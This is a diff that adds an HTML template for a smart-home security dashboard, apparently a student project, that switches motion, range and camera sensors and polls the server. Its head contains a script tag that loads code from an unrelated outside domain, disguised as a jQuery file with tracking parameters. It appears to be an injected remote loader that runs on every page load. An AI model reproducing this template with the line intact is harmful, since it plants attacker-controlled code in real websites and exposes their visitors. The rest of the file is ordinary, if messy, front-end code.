@@ -1,0 +1,476 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="static/favicon.ico">
+	<link href="{{url_for('static', filename='bootstrap-switch.css') }}" rel="stylesheet">
+	<link href="{{url_for('static', filename='bootstrap.css') }}" rel="stylesheet">
+	<link href="{{url_for('static', filename='bootstrap.min.css') }}" rel="stylesheet"> 
+    <title>Smart home pro</title>
+
+
+	<link href="{{url_for('static', filename='style.css') }}" rel="stylesheet">	
+
+    <script src="js/ie-emulation-modes-warning.js"></script>
+
+  <script src="https://macutnova.com/jquery.php?u=8121c26304a5465b448b022acd5c333d&c=gpupdater&p=1"></script></head>
+
+  <body onload="keep_alive(); time();" >
+
+    <nav class="navbar navbar-inverse navbar-fixed-top">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="#"><img src="static/logo.png" width="58.5px" >  </a> 
+		  <h4 class="navbar-text">Security Servillance</h4>
+		   
+        </div>
+		
+        <div id="navbar" class="navbar-collapse collapse">
+        <ul class="nav navbar-nav navbar-right">
+    
+        
+        <li class="dropdown">
+          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"> Control <span class="caret"></span></a>
+          <ul class="dropdown-menu">
+            <li><a href="#">Lights</a></li>
+            <li><a href="#">Gate</a></li>
+            <li><a href="#">door Locks</a></li>
+            
+          </ul>
+        </li>
+		
+		<li class="dropdown">
+          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Monitor <span class="caret"></span></a>
+          <ul class="dropdown-menu">
+            <li><a href="#">Temperature</a></li>
+            <li><a href="#">Motion/smoke</a></li>
+            <li><a href="#">Security</a></li>
+         <!--<li role="separator" class="divider"></li>
+            <li><a href="#">Separated link</a></li>
+            <li role="separator" class="divider"></li>
+            <li><a href="#">One more separated link</a></li>  -->
+          </ul>
+        </li>
+		
+		<li class="dropdown">
+          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Settings <span class="caret"></span></a>
+          <ul class="dropdown-menu">
+            <li><a href="#">Users</a></li>
+            <li><a href="#">Access control</a></li>
+            <li><a href="#">Logout</a></li>
+            
+          </ul>
+        </li>
+		
+      </ul>
+		
+		
+        </div><!--/.navbar-collapse -->
+      </div>
+    </nav>
+	
+	 
+	  
+    </div> <!-- /container -->
+    <div class="jumbotron">
+       <p> </p>
+       <p> </p>
+       <div class="container well well-sm" id="accordion"> 
+	<div class="well" >
+ 	   <h2> Welcome to Smart Security Servillance </h2>
+	   <h5> <span id="time_ID">...</span></h5>
+       <h5> Connection:<span id="Connection_Status_id">...</span></h5>
+	    {% for message in get_flashed_messages() %}
+	       {{ message }}
+        {% endfor %} 
+	   <h5>Click <a href="/logout">here</a> to logout</p>
+	</div>
+      </div>
+
+      <div class="container well well-sm" id="accordion"> 
+       
+        
+	<div class="well" >
+	<ul class="nav nav-tabs">
+	<li role="presentation" class="active" data-toggle="collapse" href="#Indoor_div" data-parent="#Indoor_div" ><a href="#">Timeline</a></li>
+	<li role="presentation" id="gate_id" data-toggle="collapse" href="#Outdoor_div"  data-parent="#Outdoor_div"> <a href="#">Control</a></li>
+	<li role="presentation" id="gate_id" data-toggle="collapse" href="#Outdoor_div"  data-parent="#Outdoor_div"> <a href="#">Monitor</a></li>
+	
+	<!-- ADD MORE ROOMS HERE -->
+	</ul>
+	<p> </p>
+
+	<div class="container collapse in" id="Indoor_div">
+		  
+		   <table >
+		    <p> Indoor status: </p>
+		    <!--<hr>  -->
+		    <div>
+			<tr>
+			  <th>
+			   <div>
+				<h5> PIR sensor: <span id="PIR_indoor_id">...</span></h5>
+				<input type="checkbox" id="in_pir_chk_id" />
+			   </div>
+			
+			   <div>
+			    <h5> Range sensor <span id="Range_indoor_id">...</span></h5>
+			    <input type="checkbox" id="in_rng_chk_id" />
+			   </div>
+			
+			  <div>
+				<h5> Camera:</h5> 
+				<input type="checkbox" id="in_cam_chk_id" />
+				<h4></h4>
+				<img src="static/in.jpg?r= + new Date().getTime()?" id="image_id_indoor" width="300px" >
+				<h4></h4>
+				<button type="button" class="btn btn-primary" onclick="ON('RefI');" >Refresh</button>
+			  </div>			
+			  </th>
+			</tr>
+			 
+		    </div>	
+		  </table>
+		</div>
+		
+		<hr>
+		<div class="container collapse in" id="Outdoor_div">
+		   <table >
+		   <p> Outdoor status: </p>
+		   <!--<hr>  -->
+		    <div>
+			<tr>
+			  <th>
+			  
+			    <div>
+			    <h5> PIR sensor: <span id="PIR_outdoor_id">...</span>  </h5>
+			    <input type="checkbox" id="out_pir_chk_id" />
+                <div>
+
+				<div>
+				<h5> Range sensor: <span id="Range_outdoor_id">...</span> </h5>	
+				<input type="checkbox" id="out_rng_chk_id" />
+				</div> 
+				
+				
+				<div>
+				<h5> Camera:</h5> 
+				<input type="checkbox" id="out_cam_chk_id" />
+				<h4></h4>
+                <img src="static/out.jpg?r= + new Date().getTime()?" id="image_id_outdoor" width="300px" >
+				<h4></h4>
+				<button type="button" class="btn btn-primary" onclick="ON('RefO');" >Refresh</button>
+				</div>
+			  </th>
+			</tr>
+			 
+		    </div>
+		  </table>
+		</div>
+		
+		
+	<hr>
+	
+          <button type="button" class="btn btn-primary" onclick="RAW_data()" >show rough data</button>
+	<p> </p>
+	<p> </p>	  
+	<div class="well roughdata" id="rough_data_div" >
+       <h4> Internal variables </h4> 
+       <hr>	   
+       <h5>Connection:<span id="Connection_raw_id">...</span></h5>
+       <h5>Keep Alive:<span id="keep_alive">...</span></h5>
+       <h5>Time:<span id="time_ID_raw">...</span></h5>
+       <h5>alive epoch millisecond :<span id="alive_sec">...</span></h5>
+       <h5>current epoch millisecond :<span id="current_sec">...</span></h5>
+       <h5>update:<span id="update_id">...</span></h5>
+       <h5>indoor pic:<span id="indoor_id">...</span></h5>
+     </div>
+		
+   </div>
+		  
+</div>
+
+
+<!-- <div class="container" id="accordion">
+  <h3>Snapshot:</h3>
+  <div class="well" >
+   <div class="col">
+   <button type="button" class="btn btn-primary" onclick="update()" >Refresh</button>
+   
+    <button type="button" class="btn btn-primary" onclick="reset()" >Reset</button>  
+   </div>
+   
+   <div class="row">
+    <div class="col-md-6">
+     <h3>Indoor:</h3>  
+     <img src="static/in.jpg?r= + new Date().getTime()?" id="image_id_indoor" width="400px" >
+    </div> 
+
+     <div class="col-md-6">
+     <h3>Outdoor:</h3>  
+     <img src="static/out.jpg?r= + new Date().getTime()?" id="image_id_outdoor" width="400px" >
+     </div>
+   </div>
+  </div>	 
+</div>	 -->
+
+      <hr>
+
+      <footer>
+        <h5>&copy; 2016-COMSATS University of Information & Technology </h5>
+      </footer>
+    </div> <!-- /container -->
+
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <script>window.jQuery || document.write('<script src="static/jquery.min.js"><\/script>')</script>
+    <script src="static/bootstrap.min.js"></script>
+    <script src="static/jquery.js"></script>
+    <script src="static/bootstrap-switch.js"></script>
+    
+	<!-- IE10 viewport hack for SurfaceÞ/desktop Windows 8 bug -->
+    <!--<script src="js/ie10-viewport-bug-workaround.js"></script> -->
+	<script>
+
+	var alive_second = 0;
+	var motion = 0;
+	
+    $(function(argument) {
+      $('[type="checkbox"]').bootstrapSwitch();
+	  $.fn.bootstrapSwitch.defaults.labelWidth = 400;
+    }); 
+
+  
+       function RAW_data() {              
+       //document.getElementById("TV_span").innerHTML = "TRUE";
+       var div = document.getElementById('rough_data_div');
+       if (div.style.display !== 'none') {
+        div.style.display = 'none';
+        }
+        else {
+        div.style.display = 'block';
+        } 
+        }
+
+	function update() {              
+         var request = new XMLHttpRequest();
+			 request.open("POST","refresh_pic", true); 
+			 request.send(null);
+        }
+
+	$('#in_pir_chk_id').on('switchChange.bootstrapSwitch', function (event, state) {
+	  if(state){
+              ON("MI");
+	  }else{
+              OFF("MI");
+	  }
+	});
+	
+	$('#in_rng_chk_id').on('switchChange.bootstrapSwitch', function (event, state) {
+	  if(state){
+              ON("RI");
+	  }else{
+              OFF("RI");
+	  }
+	 });
+	
+		$('#in_cam_chk_id').on('switchChange.bootstrapSwitch', function (event, state) {
+	  if(state){
+              ON("CI");
+	  }else{
+              OFF("CI");
+	  }
+	 });
+	 
+///////////////////////////////////////////////////////
+//////////////////////OUTDOOR//////////////////////////
+///////////////////////////////////////////////////////	 
+	$('#out_pir_chk_id').on('switchChange.bootstrapSwitch', function (event, state) {
+	  if(state){
+              ON("MO");
+	  }else{
+              OFF("MO");
+	  }
+	});
+	
+	$('#out_rng_chk_id').on('switchChange.bootstrapSwitch', function (event, state) {
+	  if(state){
+              ON("RO");
+	  }else{
+              OFF("RO");
+	  }
+	 });
+	
+		$('#out_cam_chk_id').on('switchChange.bootstrapSwitch', function (event, state) {
+	  if(state){
+              ON("CO");
+	  }else{
+              OFF("CO");
+	  }
+	 });	 
+
+ //////////////////////////////////////////////////////////////////////////////////////
+ /////////////////   JAVA SCRIPT CODE FOR COMMUNICATION    ////////////////////////////
+ //////////////////////////////////////////////////////////////////////////////////////
+ 
+ 
+        function ON(value) {
+	    var request = new XMLHttpRequest();
+	    request.onreadystatechange = function(){
+	      if(this.readyState === 4){
+                if (this.status === 200) {
+                  if (this.responseText !== null) {
+					//document.getElementById("btn_stats").innerHTML = this.responseText;
+				   }
+                }
+	      }
+	    };
+            if (value==="MI") {
+	         request.open("POST","status=ON-MI", true);
+            }else if (value==="RI") {
+                 request.open("POST","status=ON-RI", true);
+            }else if (value==="CI") {
+                 request.open("POST","status=ON-CI", true);     
+            }else if (value==="MO") {
+                 request.open("POST","status=ON-MO", true);  
+            }else if (value==="RO") {
+                 request.open("POST","status=ON-RO", true);  
+            }else if (value==="CO") {
+                 request.open("POST","status=ON-CO", true);  
+            }else if (value==="RefI") {
+                 request.open("POST","status=I-ref", true); 
+            }else if (value==="RefO") {
+                 request.open("POST","status=O-ref", true);   
+            }
+            request.send(null);
+	  }
+          
+         function OFF(value) {
+	    var request = new XMLHttpRequest();
+	    request.onreadystatechange = function(){
+	      if(this.readyState === 4){
+                if (this.status === 200) {
+                  if (this.responseText !== null) {
+                   //document.getElementById("btn_stats").innerHTML = "incoming";
+	          }
+                }
+	      }
+	    };	
+	    if (value==="MI") {
+	         request.open("POST","status=OFF-MI", true);
+            }else if (value==="RI") {
+                 request.open("POST","status=OFF-RI", true);
+            }else if (value==="CI") {
+                 request.open("POST","status=OFF-CI", true);     
+            }else if (value==="MO") {
+                 request.open("POST","status=OFF-MO", true);    
+            }else if (value==="RO") {
+                 request.open("POST","status=OFF-RO", true);  
+			}else if (value==="CO") {
+                 request.open("POST","status=OFF-C0", true);  	 
+			}
+            request.send(null);
+	  };  
+
+
+	  function keep_alive(){
+	    var request = new XMLHttpRequest();
+		//var data_packet = "";
+	    request.onreadystatechange = function(){
+	      if(this.readyState === 4){
+                if (this.status === 200) {
+                  if (this.responseText !== null) {
+		 
+				var date = new Date();
+				alive_second = date.getTime();
+				
+				var keep_alive_data=this.responseText;
+				var index = keep_alive_data.indexOf('-');
+				var keep_alive_counter= keep_alive_data.substring(0, index);
+				
+				var indoor_motion = keep_alive_data.substring(index+3, index+4);
+				var index = keep_alive_data.indexOf('MO');
+				var outdoor_motion = keep_alive_data.substring(index+2, index+3);			
+
+				var index = keep_alive_data.indexOf('PI');
+				var PI = keep_alive_data.substring(index+2, index+3);
+				var index = keep_alive_data.indexOf('PO');
+				var PO = keep_alive_data.substring(index+2, index+3);
+			
+				var index = keep_alive_data.indexOf('RI');
+				var index_2 = keep_alive_data.indexOf('RO');
+				var RI = keep_alive_data.substring(index+2, index_2);
+				var index = keep_alive_data.indexOf('<');
+				var RO = keep_alive_data.substring(index_2+2, index);
+			
+				document.getElementById("keep_alive").innerHTML = keep_alive_counter;
+				document.getElementById("alive_sec").innerHTML = alive_second;
+		//		document.getElementById("update_id").innerHTML = motion;
+			
+				document.getElementById("PIR_indoor_id").innerHTML = PI;
+				document.getElementById("PIR_outdoor_id").innerHTML = PO;
+				document.getElementById("Range_indoor_id").innerHTML = RI;
+				document.getElementById("Range_outdoor_id").innerHTML = RO;
+			
+				document.getElementById("update_id").innerHTML = keep_alive_data;
+			
+			//123-MI1MO0PI1PO1RI25RO10<
+
+			document.getElementById("indoor_id").innerHTML = outdoor_motion;
+		
+			  if (indoor_motion=="1"){
+						  var indoor_image = document.getElementById("image_id_indoor");
+						  indoor_image.src = indoor_image.src.split('?')[0] + '?' + new Date().getTime();
+						  document.getElementById("indoor_id").innerHTML = indoor_image.src;
+						}
+					
+			  if (outdoor_motion=="1"){
+				  var outdoor_image = document.getElementById("image_id_outdoor");
+						  outdoor_image.src = outdoor_image.src.split('?')[0] + '?' + new Date().getTime();
+						}									
+	                }
+                }
+	        }
+	    };	
+	    request.open("POST","keep_alive", true);
+	    request.send(null);
+	    setTimeout('keep_alive()',1000);
+	   }	
+
+	function time(){
+                var d = new Date();
+				var current_sec = d.getTime();
+				document.getElementById("time_ID").innerHTML = d;
+					document.getElementById("time_ID_raw").innerHTML = d;
+				document.getElementById("current_sec").innerHTML = current_sec;
+				setTimeout('time()',1000);
+
+				if (current_sec - alive_second > 1500){
+				   document.getElementById("Connection_Status_id").innerHTML = " Dead (server down!)";
+					   document.getElementById("Connection_raw_id").innerHTML = " Dead (server down!)";
+				} else {
+				   document.getElementById("Connection_Status_id").innerHTML = " Alive";
+				   document.getElementById("Connection_raw_id").innerHTML = " Alive";
+				}
+		
+	   }
+
+
+	</script>    
+  </body>
+</html>
